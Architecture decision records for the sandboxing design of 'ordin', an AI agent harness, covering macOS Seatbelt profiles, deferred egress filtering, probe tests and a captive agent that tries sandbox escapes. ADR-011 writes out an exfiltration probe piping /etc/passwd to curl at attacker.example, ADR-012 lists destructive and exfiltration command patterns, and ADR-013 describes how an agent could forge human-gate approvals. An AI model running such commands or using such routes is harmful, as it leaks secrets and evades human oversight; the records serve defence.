# Sandboxing — decision records

ADR-style records for ordin's v1 sandboxing design. Each record: Status / Context / Decision / Consequences. Records are append-only; supersede rather than edit when a decision changes.

For the implementation guide see [`../sandboxing-implementation.md`](../sandboxing-implementation.md). For the architecture diagram source see [`../sandboxing-architecture.md`](../sandboxing-architecture.md). For real-world findings discovered during Phase 5 smoke testing — including macOS-specific gotchas the design didn't anticipate — see [`../sandboxing-findings.md`](../sandboxing-findings.md).

## Prior art

The decisions below were informed by two adjacent projects worth reading directly when working on this code:

- **[Claude Code's sandboxing](https://code.claude.com/docs/en/sandboxing)** — Anthropic's CLI uses macOS `sandbox-exec` and Linux `bwrap` at the per-tool boundary. Same kernel primitives as us; different layer (per-tool inside the subprocess vs. per-process around the harness). Profile shape and reference deny-lists are directly applicable.
- **[Sharkcage](https://wan0.net/sharkcage/)** — Open-source kernel-enforced AI agent sandbox. Same OS primitive choices (Seatbelt / bubblewrap+seccomp / WSL2). Five-layer defense-in-depth that informs several deferred items below: SOCKS5 localhost proxy for egress (ADR-005), pre-execution command pattern scanner (ADR-012), AI-invisible gate approval channels (ADR-013). Notable explicit goal: small enough trust-critical surface to fully audit (~3.7k LOC).

Both projects validate the same primitive choices we made; sharkcage in particular explores hardening directions we mark as v2+ deferrals.

---

## ADR-001 — Sandbox boundary: B-process self-reexec

**Status:** Accepted (v1)

**Context:** ordin's agent process tree (CLI → engine → runtime → `claude -p` / AI SDK tools) runs with the user's full privileges. Three options were evaluated:

- **A.** Per-runtime sandboxing — each `AgentRuntime` wraps its own subprocess.
- **B-process.** Whole `ordin run` invocation self-reexecs under the sandbox; everything inherits.
- **B-worker.** Host process unsandboxed; engine spawned as a sandboxed child; JSONL IPC.

Option A is clean for `ClaudeCliRuntime` (one `spawn` to wrap) but breaks down for `AiSdkRuntime` whose tool loop runs in-process — every tool would need to be refactored. Each future engine (LangGraph, etc.) repeats the work. Option B-worker is strongest but introduces a new IPC seam unnecessary for a single-user dev tool.

**Decision:** Option B-process. The CLI parses args, then `execve`s itself under `sandbox-exec` so the kernel filter applies to the entire descendant process tree. Subprocesses (`claude -p`, MCP servers, AI SDK Bash tool) inherit automatically.

**Consequences:**

- One implementation point covers every current and future engine.
- `AiSdkRuntime`'s in-process tool loop is contained without refactor.
- Harness host concerns (RunStore writes, harness repo reads, TUI rendering) sit *inside* the same allowlist as the agent's concerns. Acceptable for a single-user dev tool; revisit with B-worker if a hosted/multi-tenant use case arrives.
- B-worker remains a future impl behind the same `Sandbox` interface — additive, not a redesign.

**Auditability target.** Borrowed from sharkcage's design discipline: keep `src/sandbox/` and its trust-critical dependencies small enough to be fully read by one person in a sitting. Soft budget: ≤1500 lines of TS in `src/sandbox/` (excluding tests), ≤400 lines for the rendered profile. Refuse abstractions that grow audit surface without proportionate gain. Profile authoring stays declarative (a TinyScheme template, not a builder DSL); reexec stays linear (one path, one helper module). Re-evaluate the budget at each phase and document any expansion in this ADR section.

**Alternative models considered.** Two materially different architectures exist; both rejected for v1 with reasoning preserved here so future reviewers don't re-derive it.

- **Per-command sandbox** (sharkcage's `srt`). Wrap *every* tool invocation in a fresh sandbox: `sandbox-exec -p <policy> bash -c <cmd>`. Stronger isolation (each command's sandbox is short-lived, no shared state between calls) but pays process-spawn overhead per tool call — meaningful when phases issue dozens of bash calls. Worth revisiting in v3 as an opt-in "paranoid mode" for security-sensitive contexts where the per-call latency is acceptable. The `Sandbox` interface admits this variant without redesign — the impl just changes where `enterIfNeeded` is called from (per-tool, not per-run).
- **B-worker** (separate sandboxed worker, JSONL IPC). Stronger separation of host concerns (RunStore, gates, TUI) from agent execution. Same `Sandbox` interface.

**B-worker promotion triggers.** B-process is the right v1 because the IPC seam costs more than the single-user `ordin run` workflow recoups. The trigger list — when adopting B-worker becomes net-positive — has grown longer than originally documented:

1. **TUI / sandbox lifecycle coupling** *(observed during v1 Phase 5)* — `execve` under `sandbox-exec` replaces the outer process; if the renderer initialised raw mode / mouse tracking / alt-screen first, capability-query responses leak to stdout and terminal state stays polluted. Today's mitigation (`prepareSandbox(input)` called before any TUI work — see [Finding 8](../sandboxing-findings.md#finding-8--b-process-couples-host-and-agent-lifecycles-tui-state-leaks-across-reexec)) is fragile to refactors. B-worker dissolves this — host never enters the sandbox; TUI lives outside the worker boundary.

2. **Per-phase profiles** *(v2 deliverable)* — when each phase wants its own profile, B-process means either reexec-per-phase (heavy; loses session continuity) or one union-of-all-phases profile (loose; defeats the per-phase win). B-worker spawns a fresh sandboxed worker per phase with its own profile — natural fit.

3. **Server-mode sandboxing** *(v2; ADR-008)* — `ordin serve` and `ordin mcp` cannot reexec mid-flight (server can't replace itself between requests). B-process effectively can't sandbox server modes at all. B-worker is the only viable path: server stays unsandboxed; each run spawns a sandboxed worker.

4. **Hosted / multi-tenant contexts** *(v3+)* — multiple concurrent runs need independent sandboxes. B-process means one sandbox per CLI invocation; the host can't manage many. Worker-per-run is the standard pattern.

5. **Audit-log integrity / secrets-not-shared** *(v3 hardening)* — host can hold credentials, signing keys, and write to tamper-evident audit logs (ADR-005 v3 follow-on). B-process gives the agent the same FS write access as the harness needs to write run metadata; B-worker keeps host-side state outside the worker's reach.

6. **Resource limits per run** *(future)* — `setrlimit`, OOM handling, wall-clock timeouts apply to whole processes. B-process means one limit envelope per CLI invocation; B-worker can apply different limits per worker (per phase, per agent).

The IPC seam is *cheap* in our case: gates already use async-resolve (maps to IPC-await-respond), `RunEvent`s are JSON-serializable, and `RunService.resolveGate` is literally the design pattern over a wire instead of in-memory. The cost is operational complexity, not architectural mismatch.

**When to actually promote.** Not on (1) alone — the `prepareSandbox` mitigation works. Strong promotion signals: (2) lands, OR (3) is requested, OR a contributor hits a refactor that re-introduces (1). Until then, B-worker stays the v3 deferral with the trigger list above kept current.

---

## ADR-002 — Profile strategy: broad-read + narrow-deny

**Status:** Superseded by [ADR-014](#adr-014--profile-strategy-narrow-allow-with-system-baseline-principle-of-least-privilege). Original record preserved below for the trail.

**Context:** Two profile philosophies:

- **Narrow-allow** — enumerate every readable directory.
- **Broad-read + narrow-deny** — allow read across home and system; deny a known-sensitive list.

Users will author workflows at arbitrary paths (`~/Documents/projects/foo`, mounted volumes, work directories). Narrow-allow breaks the moment someone puts a workflow somewhere unanticipated. Writes are the dangerous operation; reads are mostly inert.

**Decision:** Broad-read + narrow-deny for FS access. Reads allowed across `/`, `~/`, `/usr/`, `/opt/`, `/Library/`, `/System/`. Reads denied for `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.netrc`, `~/.config/gh`, `~/.config/op`, browser profile dirs. Writes narrow: workspace root, `~/.ordin/runs/<runId>`, per-run `$TMPDIR`.

**Consequences:**

- Matches Chromium / Firefox / Claude Code prior art.
- Users can put workflows anywhere; no per-project profile churn.
- Sensitive credential dirs are explicit deny rules; adding a new one (e.g. `~/.config/op` for 1Password CLI) is a one-line profile change.
- Symlink handling needs care: `~/.aws` may be a symlink; `sandbox-exec` denies follow the resolved path. Test the deny list against realistic dotfile setups during profile authoring.

**Alternative philosophy considered (v3 stricter mode): explicit binary allowlist.** Sharkcage enumerates allowed binaries per skill (`exec: [git, npm, node]`); we allow read+exec across the broad PATH. The stricter model could ship as a v3 opt-in "paranoid mode" derived from each phase's `allowed_tools`: `Bash(git*)` permits `git`, `Bash(pnpm install*)` permits `pnpm` + the node binaries it transitively spawns, otherwise `Bash` is denied entirely. Trade-off: substantially safer against agent-fetched executables (a script downloaded into the workspace can't run as `bash workspace/malicious.sh`) but requires accurate enumeration of each tool's transitive binaries (e.g. pnpm spawns node spawns post-install scripts that spawn …). Defer until per-phase profiles (v2) ship and we have real data on phase-tool surfaces.

---

## ADR-003 — Single CLI-wide profile in v1; per-phase profiles deferred to v2

**Status:** Accepted (v1)

**Context:** The workflow YAML already declares `allowed_tools` per phase. A natural design derives the sandbox profile from that declaration: each phase invocation enters its own profile (Plan = read-only + write `docs/rfcs/`, Build = workspace write + Bash, Review = read-only + write `reviews/`).

Per-phase profiles require either: re-entering the sandbox per phase (each phase = a fresh `sandbox-exec` invocation) or a B-worker structure where the host coordinates per-phase workers. Both add complexity v1 doesn't need.

**Decision:** v1 ships one CLI-wide profile that covers the union of all phases' needs. v2 introduces per-phase profiles derived from `allowed_tools`.

**Consequences:**

- v1 ships sooner; the sandbox is real ("workspace + dev tooling, not your dotfiles") even before phase-level narrowing arrives.
- v2 design admits B-process per-phase (re-exec per phase) or B-worker per-phase (worker per phase). Choice deferred until the use case matures.
- Multi-agent topologies *within* a phase share the phase's profile; per-sub-agent narrowing belongs in the runtime's tool dispatcher (defense in depth, not sandbox responsibility).

---

## ADR-004 — macOS-only for v1; Linux + Docker deferred

**Status:** Accepted (v1)

**Context:** ordin's current users are all macOS. The repo is open source, so Linux and Windows contributors are plausible eventually. Cross-platform was considered as a v1 criterion; rejected because the *common* sandbox interface decouples "do we sandbox" from "how on this OS." Native sandboxes (`sandbox-exec`, `bwrap`) materially outperform Docker for dev loops because they keep host-installed dev tooling (`mise`, `pnpm`, `bun`, system frameworks) visible without rebuilding container images.

**Decision:** v1 implements `SeatbeltSandbox` (macOS) only. `BwrapSandbox` (Linux), `DockerSandbox` (cross-platform fallback), and Windows support are explicit v2+ deferrals behind the same `Sandbox` interface.

**Consequences:**

- v1 ships fast; Linux contributors hit a "not implemented on linux" error from `selectSandbox` until v2.
- `PassthroughSandbox` works everywhere as the default; non-macOS users are not blocked from running ordin, just from sandboxing.
- The `Sandbox` interface design must already admit the future variants. Validated by mentally fitting `BwrapSandbox` and `DockerSandbox` into the same surface (both fit).

---

## ADR-005 — FS-only enforcement in v1; network egress deferred to v2

**Status:** Accepted (v1)

**Context:** Network egress filtering is the higher-leverage protection (exfiltration of secrets is a worse outcome than overwriting `~/.bash_profile`). But it's also the trickier design — hostname-based filtering requires either explicit `HTTPS_PROXY` env-var routing through mitmproxy (works for ~95% of dev tooling), or `pf`-based transparent redirect (heavyweight on macOS), or DNS allowlisting (cheap but bypassable by direct-IP). v1 trying to ship both FS *and* egress couples two designs that can ship independently.

**Decision:** v1 enforces filesystem only. Network rules in the profile permit all outbound. v2 layers `HTTPS_PROXY` + mitmproxy + per-phase hostname allowlist (likely derived from `allowed_tools`).

**Consequences:**

- v1 protection: a misbehaving agent can read/write the workspace + run dir + temp; it cannot read `~/.ssh` or write outside those zones. It can still hit arbitrary network endpoints — this is a known v1 gap, called out in user-facing docs.
- v2 layers cleanly on top — no v1 design is a barrier.
- LiteLLM as a model-traffic consolidator already simplifies the eventual egress allowlist (one `localhost:4000` rule covers all model providers).

**v2 egress mechanism — provisional choice: SOCKS5 localhost proxy.** Borrowed from sharkcage. SOCKS5 handles all TCP traffic, not just HTTP(S), so it covers the edge cases an HTTP-only proxy misses (Go binaries with custom TLS stacks, git over SSH, custom protocols). Tools that don't honor `HTTPS_PROXY` typically *do* honor SOCKS5 via `proxychains` or native config. mitmproxy remains valuable as a *complementary* HTTPS-aware audit/inspection layer in front of (or alongside) the SOCKS5 gate, but the primary blocker is SOCKS5.

**v2 egress UX — "approve once, enforce always".** Authoring an egress allowlist by enumeration is a maintenance burden — every new dependency / git remote / tool needs a profile edit. Borrowed from sharkcage: the *first* time a phase requests an unseen hostname, prompt the user (existing gate-prompter mechanism, surfaced as a "capability request" rather than an artefact-approval gate); persist the answer to a project-local manifest (e.g. `~/.ordin/<project>/egress.yaml`); subsequent requests use the stored answer with no further prompts. Self-bootstrapping allowlist that converges to "exactly the hostnames this project actually needs." Removes the "enumerate everything upfront" tax that makes egress allowlists fall over in practice.

**v3 egress hardening: hash-chained audit logs.** Tamper-evident `audit.jsonl` for the egress gate's allow/deny stream — same fields as the sharkcage schema (`timestamp, tool, args, result, skill/agent, capability metadata`) plus a hash chain so post-hoc tampering is detectable. Out of scope for v2's first cut but the natural follow-on for hosted / compliance contexts.

---

## ADR-006 — `~/.claude` is read-only allowed

**Status:** Accepted (v1)

**Context:** `ClaudeCliRuntime` spawns `claude -p`, which authenticates against Anthropic via OAuth tokens stored in `~/.claude/`. Under the Max-plan billing relationship (the only programmatic Claude path for the maintainer), API-key auth is not an option — the binary must be able to read its credential dir. Blocking `~/.claude` outright breaks the runtime; allowing read+write would let a misbehaving agent corrupt or exfiltrate the tokens.

**Decision:** Profile allows read of `~/.claude`; writes denied. `claude -p` authenticates normally; the agent cannot tamper.

**Consequences:**

- ClaudeCliRuntime continues to work under Max plan inside the sandbox.
- Token rotation by `claude` itself (which writes back to `~/.claude/`) breaks under the sandbox if it tries to refresh from the agent's process tree. Mitigation: tokens are refreshed by `claude` *outside* a sandboxed run (e.g., `claude` invoked unsandboxed once); the cached token is read-only sufficient for ordinary runs. Verify this assumption during Phase 5 fixture testing.
- If we ever move off Max plan to API-key auth, `~/.claude` access is no longer required and this ADR can be superseded.

---

## ADR-007 — Default sandbox = passthrough; opt-in via config or CLI flag

**Status:** Accepted (v1)

**Context:** v1 cannot guarantee a perfect profile on first ship — false-positive denials (mise shims, JetBrains tools, etc.) will surface and need iteration. Forcing every user onto sandbox-by-default risks breaking workflows the day v1 lands.

**Decision:** Default sandbox mode is `passthrough` (current behavior). Users opt in via `ordin.config.yaml: sandbox: seatbelt` or `--sandbox seatbelt` flag on `ordin run`. CLI flag overrides config. Config defaults document the option; new users see the choice without being forced into it.

**Consequences:**

- No behavior change for existing users on day-of-merge.
- Adoption is gradual; profile bugs surface from opt-in users without breaking everyone.
- Once the profile is hardened over a few weeks of opt-in use, a future ADR can supersede this and flip the default to `seatbelt`.

---

## ADR-008 — Sandbox v1 applies to `ordin run` only

**Status:** Accepted (v1)

**Context:** ordin has multiple commands: `run`, `serve` (HTTP), `mcp` (MCP server), `retro`, `status`, `doctor`. `serve` and `mcp` use `RunService` which currently calls `HarnessRuntime.startRun` in-process. Sandboxing those servers means HTTP / MCP handlers either run inside the sandbox (allowing the profile to permit their port-bind and socket I/O) or sit outside with IPC into a sandboxed worker (B-worker). The clean answer is B-worker, which is v2.

**Decision:** v1 sandboxing applies to `ordin run` only. `serve`, `mcp`, `retro`, `status`, `doctor` remain unsandboxed.

**Consequences:**

- HTTP and MCP-driven runs are unsandboxed in v1. Documented as a known limitation in user-facing docs.
- v2 sandboxing for server modes is naturally addressed by introducing B-worker, since the gate-prompter pattern already uses async-resolve over an in-memory boundary that maps cleanly onto IPC.

---

## ADR-009 — `ORDIN_SANDBOXED=1` env var for reexec loop-prevention

**Status:** Accepted (v1)

**Context:** B-process self-reexec means `ordin` calls `execve("sandbox-exec", [..., "ordin", "run", "--sandbox", ...])`. Without a marker, the new invocation re-reads `--sandbox` and re-execs again — infinite loop.

Two ways to mark "this is the inner invocation":

1. Env var `ORDIN_SANDBOXED=1` set by the outer process before `execve`.
2. Two distinct entry points (`src/cli/index.ts` is outer; `src/cli/sandboxed-entry.ts` is inner; outer execs into inner directly).

**Decision:** Env var. Standard pattern (sudo, bwrap, many self-bootstrapping tools). One entry point to maintain. The env var is loop-prevention only, not a security boundary — kernel `sandbox-exec` enforcement does the actual confinement; an attacker setting `ORDIN_SANDBOXED=1` in their shell merely bypasses the *re-exec branch*, identical to running ordin without `--sandbox`.

**Consequences:**

- One entry point in code; the inner/outer distinction is a startup-time check.
- Two-entries alternative documented and acceptable as a swap during implementation if env-var taste objections surface.

---

## ADR-010 — Phase = sandbox profile boundary in v2 (not per-agent)

**Status:** Provisional (informs v2 design; v1 ships single profile)

**Context:** When per-phase profiles arrive, the unit of confinement could be the phase (current YAML structure) or the individual agent (in a future multi-agent topology where one phase fans out to multiple cooperating agents).

Phase-level matches the existing `allowed_tools` YAML declaration, the artefact contract, and the gate boundary. Multi-agent topologies within a phase share workspace and tool surface anyway — splitting their profiles would over-fracture without commensurate security gain. Tool-surface differentiation between sub-agents is better served by the runtime's tool dispatcher refusing to dispatch certain tools to certain sub-agents.

**Decision:** When per-phase profiles ship in v2, the unit is the **phase**, not the agent. Multi-agent topologies share the phase profile. Agent-level narrowing is the runtime's tool dispatcher's responsibility (inner fence; defense in depth).

**Consequences:**

- v2 design has a clear default. Per-agent profiles can be re-evaluated if a concrete need surfaces.
- v1 single-profile design transitions cleanly: replace "one profile for the whole run" with "one profile per phase invocation" — same shape, smaller scope.

---

## ADR-011 — Adversarial verification: probe tests + captive workflow

**Status:** Accepted (v1)

**Context:** A sandbox profile is only as good as our confidence that it denies what we think. Two failure modes: profile bugs ("we thought `~/.ssh` was denied, it isn't") and unanticipated escape vectors ("the agent found a creative way out we didn't enumerate"). Hand-watching `log stream` catches some bugs; manual `cat ~/.ssh/config` testing is brittle and easy to forget.

**Decision:** Two complementary verification layers, both v1.

1. **Profile-level probe tests** — `src/sandbox/seatbelt/probes.ts` defines a `[id, description, expected, command]` table. `src/sandbox/seatbelt/probes.test.ts` (gated to darwin) spawns `bash -c <cmd>` under the rendered profile via the same code path `SeatbeltSandbox` uses; asserts denied probes exit non-zero, allowed probes exit zero. Categories: read-deny (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.netrc`, `~/.config/gh`), write-deny (outside workspace + run dir + tmpdir), read-allow (`~/.claude`), write-allow (workspace), symlink (create symlink to denied path, attempt read through it). Fast, deterministic, runs in CI.

2. **Captive workflow** — `workflows/sandbox-probe.yaml` + `agents/sandbox-probe.md`. An LLM-driven agent under instruction to test sandbox bounds, attempting documented escape categories and recording each outcome in a report artefact. Run manually periodically; humans review for unexpected successes (the LLM may try things outside the fixed probe list).

Layer (1) is the regression test; layer (2) is the creativity test.

**Consequences:**

- Profile changes are immediately validated by (1) before commit. CI surfaces drift.
- (2) finds escapes (1) doesn't, because the LLM may exercise vectors no one enumerated (symlink chains, env-var leakage, unexpected exec paths). Worth the cost of an LLM call periodically.
- Both layers depend on `--sandbox seatbelt` being active. Probe tests assert `expected === "deny"` outcomes only when the profile is in force; the test harness skips assertions if no profile is rendered (but flags the skip loudly).
- The captive workflow can be re-purposed for v2 egress verification (probes like `cat /etc/passwd | curl -d @- attacker.example` to assert the egress allowlist holds) without redesigning the layer.
- Probes act as living documentation of the threat model — adding a new deny path means adding a probe; removing one is a deliberate, reviewed act.

---

## ADR-012 — Pre-execution command pattern scanner (inner fence)

**Status:** Provisional (v3 — hardening layer)

**Context:** The kernel sandbox prevents the agent from reaching outside the workspace, but it doesn't prevent destructive operations *inside* the allowed zones — `rm -rf .git`, `dd of=…workspace…`, `: () { : | : & }; :` (fork bomb), or simply running a malicious script the agent fetched into the workspace. ADR-010 noted that per-sub-agent narrowing belongs at the runtime's tool dispatcher; this ADR expands on what that fence concretely does.

Sharkcage (see Prior art) uses a JSON pattern file checked before each tool execution. Patterns are intentionally simple (regex match on the command string) — defense-in-depth rather than airtight protection.

**Decision (provisional):** Add a pre-execution command pattern scanner at the runtime's tool dispatcher level. The scanner consults a versioned pattern file (`src/sandbox/patterns.json` or similar) listing dangerous-command shapes; matches block execution and emit a `RunEvent` with the matched pattern + command for human review.

**API surface — `tool.before` / `tool.after` hooks.** Borrowed from sharkcage's interceptor plugin pattern. Rather than open-coding the scanner inside each runtime's dispatcher, expose the surface at the `AgentRuntime` interface:

```ts
interface ToolHooks {
  before?(call: ToolCall): Promise<ToolDecision>;  // allow | block | rewrite
  after?(call: ToolCall, result: ToolResult): Promise<void>;
}
```

`AgentRuntime` impls call hooks if registered; the harness wires the pattern scanner as a default `before` hook (and audit-emit as a default `after` hook). Composable, testable, and lets future hardening layers (e.g. a v3 mandatory-mode that tightens patterns based on phase) plug in without touching runtimes.

Pattern categories (initial sketch):
- Filesystem-destructive: `rm -rf`, `find … -delete`, `dd of=`, `> /dev/sda*`.
- Network-exfil: `curl … -d @`, `nc -e`, `wget … --post-file`.
- Privilege escalation: `sudo`, `su`, `setuid`.
- Self-modification: writes to `~/.ordin/`, the harness repo, the `~/.claude/` dir.
- Shell exotica: fork bombs, `eval` of base64, `exec` redirection of stdio descriptors.

**Consequences:**

- Catches destructive commands the kernel sandbox allows because they're inside the workspace.
- Pattern matching is fragile by nature — bypasses exist (`r''m -rf`, base64, command substitution). The scanner is *defense-in-depth*, not the primary protection. It buys time and creates audit signal.
- v2 work, not v1 — out of scope until kernel sandbox + egress are stable.
- Pattern file is versioned in-repo and treated as a security-relevant artefact: changes go through review.
- Probe tests (ADR-011) extend to cover the pattern file: each pattern gets a probe asserting it actually blocks the matching command.

---

## ADR-013 — AI-invisible gate approval channels (prompt-injection hardening)

**Status:** Provisional (v3 — hardening layer)

**Context:** Today's `HumanGate` surfaces prompts via the OpenTUI footer or the HTTP `RunService` endpoint. Both are technically reachable through channels the agent can write to (the agent prints to the same stdout the TUI renders into; an agent with HTTP egress could in principle craft a request to its own gate endpoint). Prompt-injection-resistant gate prompting requires the human-decision channel to be physically out-of-band — a path the agent cannot perceive, fake, or influence.

Sharkcage (see Prior art) routes approvals through Signal / Telegram. The user receives a push notification on a separate device; their decision is delivered back through the same external channel. The agent has no way to forge "[gate approved]" because the approval doesn't traverse anything the agent can write.

**Decision (provisional):** Provide an out-of-band `GatePrompter` impl as a v2+ option. Concrete candidates: a Signal-bot prompter, an Apple Push Notification prompter, an SMS prompter (via Twilio), or a phone-side companion app that polls the harness's HTTP endpoint with auth tied to a hardware key. Existing `RunService.resolveGate` already provides the architectural seam — only the prompter changes.

**Consequences:**

- Any phase with a `human` gate can be configured to require out-of-band approval; phases with `auto` gates are unaffected.
- A compromised agent cannot fake gate approvals — the channel is outside its sandbox by construction (kernel + transport-level).
- Implementation cost is real (notification routing, auth, mobile UX) — defer until prompt-injection-resistance becomes a concrete requirement (e.g. ordin processes anything sensitive, or runs unattended).
- Existing TUI / HTTP / MCP prompters remain valid for the dev-loop use case where the user is the one running the agent and prompt injection of self-issued tasks is a low risk.

---

## ADR-014 — Profile strategy: narrow-allow with system baseline (principle of least privilege)

**Status:** Accepted (v1) — supersedes [ADR-002](#adr-002--profile-strategy-broad-read--narrow-deny).

**Context:** ADR-002 chose broad-read + narrow-deny on the basis that enumerating every readable path on macOS was impractical. On review, that argument doesn't hold:

- The "system baseline is unenumerable" objection — Apple-style sandboxes solve this with explicit allows for the dyld cache and frameworks (`/usr`, `/System`, `/Library`, `/private/var/db/dyld`). Chromium and Firefox both do this. One block of allows, ~10 lines.
- The "dev tooling varies per user" objection — the *roots* are a finite enumerable list (~15 entries: `/opt/homebrew`, `~/.local`, `~/.bun`, `~/.cargo`, `~/.rustup`, `~/.asdf`, `~/.nvm`, `~/.npm`, `~/Library/pnpm`, etc.). Maintainable.
- The "workspaces live anywhere" objection — workspace path is a profile parameter; a single `(allow file-read* (subpath WORKSPACE_ROOT))` covers any location.

The asymmetry of failure modes is decisive. Under broad-read + narrow-deny, a credential dir we forgot to deny leaks silently. Under narrow-allow, a tool path we forgot to allow breaks loudly with an error pointing exactly at the missing rule. **Loud-and-broken beats silent-and-leaked for security defaults.**

ADR-002's risk envelope was much wider than appreciated: `~/Documents`, `~/Desktop`, `~/Downloads`, `~/Movies`, `~/Pictures`, `~/Library/Mobile Documents` (iCloud), `~/Library/Mail`, `~/Library/Messages`, `~/Library/Application Support/{Slack,Discord,Signal,Telegram}`, plus arbitrary `~/.foo/credentials` patterns we don't know about — all reachable under broad-read once the user grants the parent terminal Full Disk Access (which the README pre-flight tells them to do). None of these are useful for dev work; all of them are sensitive.

**Decision:** Narrow-allow with system baseline. Profile structure:

1. `(deny default)` as the baseline.
2. **System baseline via `(import "system.sb")`**, plus explicit allows for the operations that import suppresses (`mach-bootstrap`, `syscall*`, `mach-lookup`, `sysctl-read`, `iokit-open`, `ipc-posix-shm`, `ipc-posix-sem`). Plus a small extra-roots list (`/usr`, `/bin`, `/sbin`, `/private/etc`, `/Library`, `/Applications`, `/opt`) for tools beyond what system.sb covers. Plus `(allow dynamic-code-generation)` for JIT engines (Bun, V8, JVMs). See [findings doc](../sandboxing-findings.md) for the deployment-derived rationale — the original "we don't import system.sb" reasoning was wrong on review.
3. **Dev tooling roots** allowed for read: enumerated list of common per-user tool installs (`~/.local`, `~/.bun`, `~/.cargo`, `~/.rustup`, `~/.asdf`, `~/.nvm`, `~/.npm`, `~/.pnpm-store`, `~/.gem`, `~/.composer`, `~/.go`, `~/.cache`, `~/.config/mise`, `~/Library/pnpm`).
4. **Common config files** allowed for read: `~/.gitconfig`, `~/.bash_profile`, `~/.bashrc`, `~/.zshrc`, `~/.zshenv`, `~/.profile`. (Literal-file allows, not subpaths.)
5. **`~/.claude`** allowed for read (ADR-006 — Max-plan auth).
6. **Workspace + run-store + temp** allowed for read+write.
7. **Defense-in-depth denies** for paths the rules above might inadvertently expose (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.docker`, `~/.config/gh`, `~/.config/op`, plus literals `~/.netrc`, `~/.git-credentials`, `~/.npmrc`, `~/.pypirc`). Most of these are denied by default (no allow rule covers them) but explicit deny gives belt-and-braces protection if the allow list ever broadens.

**Consequences:**

- ~/Documents, ~/Desktop, ~/Downloads, iCloud, Mail, Messages, Slack, browser data, and arbitrary `~/.foo/creds` patterns are all denied by default — without us having to enumerate them.
- Dev workflows will discover missing allow rules during Phase 5 fixture testing. Expected, accepted, security-positive iteration.
- Phase 6 probe tests gain real meaning: deny-by-default means probes for `~/Documents/anything`, `~/Library/Messages`, `~/.docker/config.json` all assert deny — and they'd fail if anyone accidentally widens the allow list.
- Profile is longer than ADR-002's version — soft auditability budget (ADR-001) accommodates it well within ≤400 lines for the rendered profile.
- ADR-002 is preserved as the superseded record; the trail of "we considered this and reversed" is intact.
